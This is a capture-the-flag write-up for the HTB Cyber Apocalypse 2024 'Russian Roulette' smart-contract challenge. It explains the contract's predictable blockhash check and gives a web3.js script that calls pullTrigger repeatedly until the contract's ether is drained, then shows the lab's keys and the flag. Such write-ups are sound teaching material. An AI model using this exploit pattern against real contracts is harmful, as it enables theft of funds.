# HTB Cyber Apocalypse 2024: Hacker Royale - Russian Roulette

## Challenge

> Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough?

## Metadata

- Difficulty: very easy
- Creator: `perrythepwner`
- Files: [`Setup.sol`](files/Setup.sol), [`RussianRoulette.sol`](files/RussianRoulette.sol)
- Docker: yes
- Tags: `blockchain`, `smart contracts`
- Points: `300`
- Number of solvers: 

## Solution

We get two smart contract implementations in Solidity: [`Setup.sol`](files/Setup.sol) and [`RussianRoulette.sol`](files/RussianRoulette.sol).

Let's start to analyze `Setup.sol` first:

```solidity
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {
    RussianRoulette public immutable TARGET;

    constructor() payable {
        TARGET = new RussianRoulette{value: 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}

```

The contract is pretty simple, it is a typical `Setup.sol` for a smart contract challenge. In the constructor, it initializes a `RussianRoulette` contract eith `10 ether` and the `isSolved` function check whether the `RussianRoulette` contract has `0 ether`.

Now let's analyze the `RussianRoulette.sol` file:

```solidity
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // 💀
        } else {
		return "im SAFU ... for now";
	    }
    }
}
```

The `pullTrigger` function check whether the hash of the previous block modulo 10 is 7. If not, it returns a string, if yes, it destroys the contract and sends all `ether` in the contract to the caller.

### The vulnerability

Eventually if we call `pullTrigger` a few times, we create new block and out of 10 block statistically form one of them the `if` condition will be true.

### The solution

I've created a [`solve.js`](files/solve.js) which calls the `pullTrigger` function until the challenge is solved. Also compiled the contracts to get the ABI JSON files ([`RussianRoulette_sol_RussianRoulette.json`](files/RussianRoulette_sol_RussianRoulette.json), [`Setup_sol_Setup.json`](files/Setup_sol_Setup.json)):

```bash
$ sudo apt install nodejs
$ sudo apt install npm
$ sudo npm i -g web3
$ sudo npm i -g sol
$ sudo npm i -g solc@0.8.23
$ export NODE_PATH=$(npm root --quiet -g)
$ npx solcjs Setup.sol --bin --abi
```

```javascript
const Web3 = require('web3');

const web3 = new Web3.Web3(new Web3.Web3.providers.HttpProvider('http://94.237.59.119:56217'));

const privateKey = '0xfeabee495252e1d68de99edee0e78a0a1c4be31f258fd71ae4d93a3392e8c0a1'
const signer = web3.eth.accounts.privateKeyToAccount(privateKey);
const Setup_deployedAddress = '0x6C093c4dD4aA6F0bb532CC47cf6216eb3F57e580';
const RussianRoulett_deployedAddress = '0xa3609eE8ebaEeA37BdC09915fb17dE3379409c2C';

const Setup_abi = require('./contracts/Setup_sol_Setup.json');
const SetupContract = new web3.eth.Contract(Setup_abi, Setup_deployedAddress);
const RussianRoulette_abi = require('./contracts/RussianRoulette_sol_RussianRoulette.json');
const RussianRoulettContract = new web3.eth.Contract(RussianRoulette_abi, RussianRoulett_deployedAddress);

async function callIsSolved() {
  return SetupContract.methods.isSolved().call();
}

async function callPullTrigger() {
  await RussianRoulettContract.methods.pullTrigger().send({
      from: signer.address,
      gas: 1000000,
    }).then(
    value => console.log('pullTrigger called')
  ).catch(error => console.error('Error calling pullTrigger: ', error));
}

async function exploit() {
  var solved = await callIsSolved()
  console.log(`Solved: `, solved)
  while (solved == false){
    await callPullTrigger()
    solved = await callIsSolved()
    console.log(`Solved: `, solved)
  }
}

exploit()
```

```
$ node solve.js
Solved: false
pullTrigger called
Solved: false
pullTrigger called
Solved: false
pullTrigger called
Solved: false
pullTrigger called
Solved: true
```

Now let's try to get the flag from the other port:

```
$ nc 94.237.59.119 41926
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0xbcbd57858f1e0604060bc2e6e4075589c95cbfdf3c8f05dac5963ff129393f37
Address         :  0x2e0C1FD6033b0D3d6ef69c3F1776c51bcD0d9715
Target contract :  0xC6F79C7Daf5943FC196C7d41f1A8F6802Db93D49
Setup contract  :  0x4e1CA36DbC9a3a5C46B32D664111CB87253b6582

$ nc 94.237.59.119 41926
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}
```

Flag: `HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}`

Some notes from the offical write-up:
- I've leant that for these kind of challenges it is much easire to use [`Foundry`](https://book.getfoundry.sh/).
> It's worth noting that starting from the Solidity 0.8.24, known as "Cancun" the behavior of `selfdestruct` is going to change. Following this upgrade, invoking `selfdestruct` will no longer clear the contract code unless it's executed during the contract deployment transaction. [reference](https://eips.ethereum.org/EIPS/eip-6780)